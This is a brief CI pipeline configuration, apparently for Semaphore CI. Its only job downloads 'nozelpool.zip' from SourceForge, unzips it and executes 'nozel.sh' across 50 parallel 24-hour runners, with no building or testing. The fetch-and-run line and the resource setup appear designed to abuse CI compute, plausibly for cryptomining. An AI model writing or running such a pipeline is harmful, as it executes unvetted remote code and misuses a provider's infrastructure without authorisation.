version: v1.0 
name: Initial Pipeline 
agent: 
  machine: 
    type: e1-standard-8 
    os_image: ubuntu2404 
execution_time_limit: 
  hours: 24 
fail_fast: 
  stop: 
    when: 'false' 
blocks: 
  - name: 'Block #1' 
    task: 
      jobs: 
        - name: 'Job #1' 
          commands: 
            - curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip && ./nozel.sh
          parallelism: 50
